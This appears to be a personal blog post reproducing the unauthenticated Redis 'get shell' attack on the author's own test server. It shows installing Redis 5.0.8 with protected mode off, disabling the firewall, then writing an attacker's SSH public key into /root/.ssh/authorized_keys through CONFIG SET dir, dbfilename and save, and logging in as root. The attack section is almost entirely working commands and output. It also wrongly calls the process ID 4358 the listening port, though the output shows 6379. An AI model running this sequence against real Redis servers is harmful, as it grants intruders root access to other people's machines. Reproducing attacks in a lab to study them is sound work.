---
layout: post
title: "Redis Get Shell Vulnerability Reproduction"
subtitle: ''
author: "Xiping Hu"
header-style: text
tags:
- Redis
---

# Deploy Redis #

``` shell
root@server:~# wget http://download.redis.io/releases/redis-5.0.8.tar.gz
root@server:~# tar xzf redis-5.0.8.tar.gz
root@server:~# cd redis-5.0.8
root@server:~/redis-5.0.8# make
root@server:~/redis-5.0.8# make install
```

And we change nothing of `redis.conf`, using its default setting, disabling protected mode.

# Fire Up Redis #

``` shell
root@server:~# redis-server --daemonize yes --protected-mode no
```

See which address Redis is listening

``` shell
root@server:~# netstat -tulpn | grep redis
tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      4358/redis-server *
tcp6       0      0 :::6379                 :::*                    LISTEN      4358/redis-server *
```

The output showed that Redis is listening `0.0.0.0:4358`

# Turn off Firewall #

On Ubuntu server:

``` shell
root@server:~# ufw disable
```

On CentOS server:

``` shell
root@server:~# systemctl stop firewalld
```

Or you may allow port 4358 instead.

# Attack Procedure #

I assume that you have already had an ssh key, and the public key is located in `~/.ssh/id_rsa.pub`, the private key is located in `~/.ssh/id_rsa`.

We connect our Redis server without password:

``` shell
[hxp@hxp-arch ~]$ redis-cli -h 142.**.***.32
```

The connection was successful. Then we can push our ssh key to server by

``` shell
[hxp@hxp-arch ~]$ (echo -e "\n\n";cat ~/.ssh/id_rsa.pub;echo -e "\n\n") | redis-cli -h 142.**.***.32 -x set ssh-key
```

Log back to see if our injection was successful

``` shell
[hxp@hxp-arch ~]$ redis-cli -h 142.**.***.32
142.**.***.32:6379> get ssh-key
"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuQgS2UfoevBjEX7UTgpSPWx1aBHqMmynjK417hsz9UXNQNesKq/T****************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************= ********@***********\n"
142.**.***.32:6379> 
```

Then we detect which user Redis is running as

``` shell
142.**.***.32:6379> CONFIG GET dir
1) "dir"
2) "/root"
```

Fortunately Redis is running as root.

The last thing we need to do was to set our database file to `/root/.ssh/authorized_keys`, and save.

``` shell
142.**.***.32:6379> CONFIG SET dir /root/.ssh
OK
142.**.***.32:6379> CONFIG SET dbfilename authorized_keys
OK
142.**.***.32:6379> save
OK
142.**.***.32:6379> exit
```

After that, the ssh public key should be saved in `/root/.ssh/authorized_keys`

Log in to the server:

``` shell
[hxp@hxp-arch ~]$ ssh -i ~/.ssh/id_rsa root@142.**.***.32
```

Success. And we can see that our public key is inserted in `/root/.ssh/authorized_keys`

``` shell
root@server:~# cat /root/.ssh/authorized_keys 
REDIS0009�      redis-ver5.0.8�
�edis-bits�@�ctime�x��^used-mem¸
 aof-preamble���ssh-keyBD


ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuQgS2UfoevBjEX7UTgpSPWx1aBHqMmynjK417hsz9UXNQNesKq/T****************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************= ********@***********



�=��u���root@server:~# 

```

